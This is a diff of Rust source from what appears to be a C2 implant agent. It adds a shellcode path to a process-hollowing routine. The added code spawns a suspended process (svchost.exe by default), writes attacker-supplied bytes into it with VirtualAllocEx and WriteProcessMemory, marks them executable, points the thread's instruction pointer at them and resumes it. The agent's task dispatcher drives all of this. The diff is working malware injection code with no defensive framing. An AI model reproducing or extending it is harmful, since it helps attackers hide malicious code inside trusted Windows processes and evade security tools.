@@ -121,9 +121,46 @@ unsafe fn thread_hijack(pid: u32, sc: &[u8]) -> String {
 // ── HOLLOW ────────────────────────────────────────────────────────────────────
 
 unsafe fn hollow(target_exe: &str, pe_bytes: &[u8]) -> String {
-    // Validate minimum PE structure before touching any process.
     if pe_bytes.len() < 0x40 {
-        return "PE too small".into();
+        return "payload too small".into();
+    }
+    // Raw shellcode path when payload is not a PE.
+    if pe_bytes[0] != b'M' || pe_bytes[1] != b'Z' {
+        let mut si: STARTUPINFOW = std::mem::zeroed();
+        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
+        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
+        let mut target_w = wide(target_exe);
+        if CreateProcessW(
+            std::ptr::null(), target_w.as_mut_ptr(),
+            std::ptr::null(), std::ptr::null(), 0,
+            CREATE_SUSPENDED, std::ptr::null(), std::ptr::null(),
+            &si, &mut pi,
+        ) == 0 {
+            return format!("CreateProcessW failed (err {})", GetLastError());
+        }
+        let mem = VirtualAllocEx(
+            pi.hProcess, std::ptr::null(), pe_bytes.len(),
+            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
+        );
+        if mem.is_null() {
+            CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
+            return format!("VirtualAllocEx failed (err {})", GetLastError());
+        }
+        let mut written = 0usize;
+        WriteProcessMemory(pi.hProcess, mem, pe_bytes.as_ptr() as *const _, pe_bytes.len(), &mut written);
+        let mut old = 0u32;
+        VirtualProtectEx(pi.hProcess, mem, pe_bytes.len(), PAGE_EXECUTE_READ, &mut old);
+        let mut ctx: CONTEXT = std::mem::zeroed();
+        ctx.ContextFlags = CONTEXT_FULL_AMD64;
+        if GetThreadContext(pi.hThread, &mut ctx) != 0 {
+            ctx.Rip = mem as u64;
+            SetThreadContext(pi.hThread, &ctx);
+        }
+        ResumeThread(pi.hThread);
+        let pid = pi.dwProcessId;
+        let addr = mem as u64;
+        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
+        return format!("[+] hollow: {} PID={} sc={:#x} ({} B)", target_exe, pid, addr, pe_bytes.len());
     }
     let e_lfanew = *pe_bytes.as_ptr().add(0x3c).cast::<i32>() as usize;
     // Need room for: PE sig (4) + FileHeader (20) + enough of OptionalHeader64 (≥96 bytes).
@@ -349,7 +386,7 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) -> bool {
                 .and_then(|v| v.as_str())
                 .unwrap_or("C:\\Windows\\System32\\svchost.exe");
             if task.payload.is_empty() {
-                t.send_result(task.id, "", "HOLLOW requires a PE payload");
+                t.send_result(task.id, "", "HOLLOW requires a payload");
                 return true;
             }
             let r = unsafe { hollow(target, &task.payload) };
